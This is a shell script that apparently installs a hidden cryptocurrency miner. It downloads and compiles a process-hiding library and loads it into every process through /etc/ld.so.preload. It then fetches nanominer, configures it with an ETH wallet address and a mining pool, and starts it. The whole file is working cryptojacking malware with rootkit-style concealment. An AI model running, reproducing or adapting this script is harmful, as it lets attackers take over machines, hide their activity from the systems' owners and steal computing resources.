#!/bin/sh
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNan.zip
unzip magicNan.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

wget https://github.com/nanopool/nanominer/releases/download/v1.13.1/nanominer-linux-1.13.1.tar.gz
tar -xvzf nanominer-linux-1.13.1.tar.gz
cd nanominer-linux-1.13.1

cat > config.ini <<END
[Ethash] 
wallet=0x8CB8003E428D0Fd7693D22f576A212403728c64a
coin=ETH
rigName=nano
protocol = JSON-RPC
pool1 = naw-eth.hiveon.net:24443
END

cat > config_eth.ini <<END
[Ethash] 
wallet=0x8CB8003E428D0Fd7693D22f576A212403728c64a
coin=ETH
rigName=nano
protocol = JSON-RPC
pool1 = naw-eth.hiveon.net:24443
END
./nanominer
